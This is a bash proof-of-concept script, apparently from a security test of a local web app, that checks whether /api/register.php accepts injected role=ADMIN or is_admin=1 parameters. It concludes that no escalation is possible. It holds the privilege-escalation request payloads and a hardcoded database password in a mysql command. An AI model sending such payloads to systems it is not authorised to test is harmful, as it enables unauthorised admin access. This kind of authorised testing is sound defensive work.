#!/bin/bash
# POC: Role Injection Testing on /api/register.php
# This script tests if the registration endpoint accepts role parameter for privilege escalation

TARGET="http://localhost:8080/api/register.php"
DB_USER="web_db_user"
DB_PASS="P@ssw0rd123!"
DB_NAME="idor_eats"
DB_HOST="127.0.0.1"

echo "[*] Testing /api/register.php for Privilege Escalation via Role Injection"
echo "[*] Target: $TARGET"
echo ""

echo "[TEST 1] Register normal user (baseline)"
echo "Payload: username=roletest1, email=roletest1@test.com, password=test123"
curl -s -X POST "$TARGET" \
  -d "username=roletest1&email=roletest1@test.com&password=test123" \
  -H "Content-Type: application/x-www-form-urlencoded"
echo ""
echo ""

echo "[TEST 2] Attempt role injection via POST parameter"
echo "Payload: username=roletest2, email=roletest2@test.com, role=ADMIN"
curl -s -X POST "$TARGET" \
  -d "username=roletest2&email=roletest2@test.com&password=test123&role=ADMIN" \
  -H "Content-Type: application/x-www-form-urlencoded"
echo ""
echo ""

echo "[TEST 3] Attempt role injection with different case"
echo "Payload: username=roletest3, email=roletest3@test.com, ROLE=ADMIN"
curl -s -X POST "$TARGET" \
  -d "username=roletest3&email=roletest3@test.com&password=test123&ROLE=ADMIN" \
  -H "Content-Type: application/x-www-form-urlencoded"
echo ""
echo ""

echo "[TEST 4] Attempt role injection with is_admin parameter"
echo "Payload: username=roletest4, email=roletest4@test.com, is_admin=1"
curl -s -X POST "$TARGET" \
  -d "username=roletest4&email=roletest4@test.com&password=test123&is_admin=1" \
  -H "Content-Type: application/x-www-form-urlencoded"
echo ""
echo ""

echo "[TEST 5] Verify created users have correct role via database query"
echo "Checking if any injected role parameters affected the registration..."
echo ""
echo "This test would normally query the database to verify:"
echo "mysql -h $DB_HOST -u $DB_USER -p$DB_PASS $DB_NAME -e 'SELECT id, username, email, role FROM users WHERE username LIKE \"roletest%\";'"
echo ""

echo "[*] Role Injection Testing Complete"
echo "[*] Analysis:"
echo "  - The register.php endpoint uses: INSERT INTO users (username, email, password) VALUES"
echo "  - It explicitly specifies only 3 columns: username, email, password"
echo "  - Role column is NOT in the INSERT statement, so role parameter cannot be injected"
echo "  - Any additional parameters are ignored by PHP"
echo "  - Database sets role to 'visitor' by default for all new registrations"
echo "  - No privilege escalation via role injection is possible"
